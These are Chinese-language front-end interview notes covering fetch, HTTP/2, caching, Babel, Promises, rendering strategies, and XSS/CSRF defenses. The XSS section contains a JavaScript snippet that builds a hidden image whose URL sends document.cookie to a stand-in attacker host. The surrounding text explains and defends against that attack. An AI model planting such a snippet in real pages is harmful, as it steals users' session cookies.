fetch 是浏览器提供的一个新的 web API，它用来代替 Ajax（XMLHttpRequest），其提供了更优雅的接口，更灵活强大的功能。 Fetch 优点主要有：

- 语法简洁，更加语义化
- 基于标准 Promise 实现，支持 `async/await`

```
fetch(url).then(response => response.json())
  .then(data => console.log(data))
  .catch(e => console.log("Oops, error", e))
```

##### http2.0和https

与HTTP/1相比，主要区别包括

- HTTP/2采用二进制格式而非文本格式（二进制协议解析起来更高效）
- HTTP/2是完全多路复用的，即一个TCP连接上同时跑多个HTTP请求
- 使用报头压缩，HTTP/2降低了开销
- HTTP/2让服务器可以将响应主动“推送”到客户端缓存中，支持服务端推送（就是服务器可以对一个客户端请求发送多个响应）

##### 浏览器输入 url 之后敲下回车，刷新 F5 与强制刷新(Ctrl + F5)，又有什么区别？

实际上浏览器输入 url 之后敲下回车就是先看本地 cache-control、expires 的情况，刷新(F5)就是忽略先看本地 cache-control、expires 的情况，带上条件 If-None-Match、If-Modified-Since，强制刷新(Ctrl + F5)就是不带条件的访问

##### babel的原理

使用 babylon 解析器对输入的源代码字符串进行解析并生成初始 AST 遍历 AST 树并应用各 transformers（plugin） 生成变换后的 AST 树 利用 babel-generator 将 AST 树输出为转码后的代码字符串 分为三个阶段：

解析：将代码字符串解析成抽象语法树 变换：对抽象语法树进行变换操作 再建：根据变换后的抽象语法树再生成代码字符串

##### Promise实现原理

现在回顾下Promise的实现过程，其主要使用了设计模式中的观察者模式：

- 通过`Promise.prototype.then`和`Promise.prototype.catch`方法将观察者方法注册到被观察者Promise对象中，同时返回一个新的Promise对象，以便可以链式调用。
- 被观察者管理内部pending、fulfilled和rejected的状态转变，同时通过构造函数中传递的resolve和reject方法以主动触发状态转变和通知观察者。

`Promise.then()`是异步调用的，这也是Promise设计上规定的，其原因在于同步调用和异步调用同时存在会导致混乱。

为了暂停当前的 promise，或者要它等待另一个 promise 完成，只需要简单地在 then() 函数中返回另一个 promise。

Promise 也有一些缺点。首先，无法取消 Promise，一旦新建它就会立即执行，无法中途取消。其次，如果不设置回调函数，Promise 内部抛出的错误，不会反应到外部。第三，当处于 Pending 状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。

一般来说，不要在then方法里面定义Reject状态的回调函数（即then的第二个参数），总是使用catch方法，理由是更接近同步的写法。 then的第二个函数参数和catch等价

##### 前端渲染的优势

- 局部刷新。无需每次都进行完整页面请求
- 懒加载。如在页面初始时只加载可视区域内的数据，滚动后rp加载其它数据，可以通过 react-lazyload 实现
- 富交互。使用 JS 实现各种酷炫效果
- 节约服务器成本。省电省钱，JS 支持 CDN 部署，且部署极其简单，只需要服务器支持静态文件即可
- 天生的关注分离设计。服务器来访问数据库提供接口，JS 只关注数据获取和展现
- JS 一次学习，到处使用。可以用来开发 Web、Serve、Mobile、Desktop 类型的应用

##### 服务端渲染的优势

- 更好的 SEO，由于搜索引擎爬虫抓取工具可以直接查看完全渲染的页面。
- 服务端渲染不需要先下载一堆 js 和 css 后才能看到页面（首屏性能）
- 服务端渲染不用关心浏览器兼容性问题（随意浏览器发展，这个优点逐渐消失）
- 对于电量不给力的手机或平板，减少在客户端的电量消耗很重要

#### XSS和CSRF 防御

XSS和CSRF都属于跨站攻击，XSS是实现CSRF诸多途径中的一条，但不是唯一一条

xss的本质是让对方浏览器执行你插入的js ，来获取cookie等信息；csrf是借用用户的身份，向服务器发送请求

XSS分为存储型和反射型：

- 存储型XSS，持久化，代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等
- 反射型XSS，非持久化，需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS

##### XSS防范：

1）客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行

- 移除用户上传的DOM属性，如onerror等
- 移除用户上传的style节点，script节点，iframe节点等 2）对用户输入的代码标签进行转换（html encode） 3）对url中的参数进行过滤 4）对动态输出到页面的内容进行HTML编码 5）服务端对敏感的Cookie设置 httpOnly属性，使js脚本不能读取到cookie

1. CSP 即是 Content Security Policy

```
var img = document.createElement('img');
img.src='http://www.xss.com?cookie='+document.cookie;
img.style.display='none';
document.getElementsByTagName('body')[0].appendChild(img);

这样就神不知鬼不觉的把当前用户的cookie发送给了我的恶意站点，我的恶意站点通过获取get参数就拿到了用户的cookie。当然我们可以通过这个方法拿到用户各种各样的数据。
```

目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的`<script>`标签，这段脚本很明显就是一段xss攻击向量，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。可以在浏览器中将这个拦截关闭

##### 跨站请求伪造的过程与防范：

[http://www.imooc.com/article/13552](http://www.imooc.com/article/13552)

过程：用户小明在你的网站A上面登录了，A返回了一个session ID（使用cookie存储）,小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址，小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求，通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。

1）使用token：服务器随机产生tooken，然后以tooken为秘钥产生一段密文，把token和密文都随cookie交给前端，前端发起请求时把密文和token交给后端，后端对token和密文进行验证，看token能不能生成同样的密文，这样即使黑客拿到了token也无法拿到密文

```
http://www.weibo.cn?follow_uid=123&token=73ksdkfu102

```

2）使用验证码：每一个重要的post提交页面，使用一个验证码，因为第三方网站是无法获得验证码的

3）检测http的头信息refer。Referer记录了请求的来源地址，服务器要做的是验证这个来源地址是否合法

4）涉及敏感操作的请求改为POST请求

